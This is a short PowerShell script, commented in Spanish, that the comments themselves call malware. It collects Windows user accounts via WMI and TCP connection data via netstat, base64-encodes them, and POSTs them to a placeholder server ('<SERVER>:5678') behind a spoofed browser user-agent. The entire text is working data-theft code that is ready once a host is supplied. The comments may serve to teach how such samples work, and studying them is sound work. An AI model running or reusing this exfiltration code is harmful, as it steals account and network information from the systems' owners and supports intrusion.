# Esta linea de codigo consulta los datos de los usuarios en sistema (directamente desde el WMI)
$users = Get-WmiObject -Namespace root\cimv2 -Class Win32_UserAccount | Out-string

# Esta linea de codigo obtiene las conexiones del sistema
$tcpconn = netstat -anop tcp

# Aca se junta la información de usuarios y la de netstat y se encodean en base64 para ser enviadas.
$b = [System.Text.Encoding]::UTF8.GetBytes($users + "\n" + $tcpconn)
$sendata = [System.Convert]::ToBase64String($b)

# Toda esta sección del malware envia los datos recopilados a un servidor (<SERVER>) via POST
$URL = "http://<SERVER>:5678/" 
$wc = new-object net.WebClient
$wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
$wc.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727)")

$NVC = New-Object System.Collections.Specialized.NameValueCollection
$NVC.Add("data", $sendata);
$wc.QueryString = $NVC

$Result = $WC.UploadValues($URL,"POST", $NVC)